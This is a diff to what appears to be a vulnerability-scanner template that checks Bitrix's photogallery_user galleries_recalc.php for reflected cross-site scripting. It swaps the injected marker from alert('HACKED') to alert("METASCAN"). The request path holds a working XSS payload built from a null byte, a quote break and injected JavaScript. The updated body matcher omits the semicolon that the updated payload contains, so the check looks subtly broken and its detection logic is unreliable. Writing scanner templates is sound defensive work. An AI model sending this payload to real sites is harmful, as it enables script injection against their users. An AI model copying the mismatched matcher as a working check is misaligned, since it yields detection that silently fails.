@@ -17,7 +17,7 @@ info:
 requests:
   - method: GET
     path:
-      - "{{BaseURL}}/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};alert('HACKED');if(1){//"
+      - '{{BaseURL}}/bitrix/components/bitrix/photogallery_user/templates/.default/galleries_recalc.php?AJAX=Y&arParams[PERMISSION]=W&arParams[IBLOCK_ID]=1%00%27}};alert("METASCAN");if(1){//'
 
     matchers-condition: and
     matchers:
@@ -30,7 +30,7 @@ requests:
       - type: word
         part: body
         words:
-          - "alert('HACKED');if(1){//', 'AJAX' : 'Y', 'sessid' : phpVars.bitrix_sessid, 'ID' : iPhotoGalleryRecalcIndex};"
+          - 'alert("METASCAN")if(1){//'
 
       - type: status
         status:
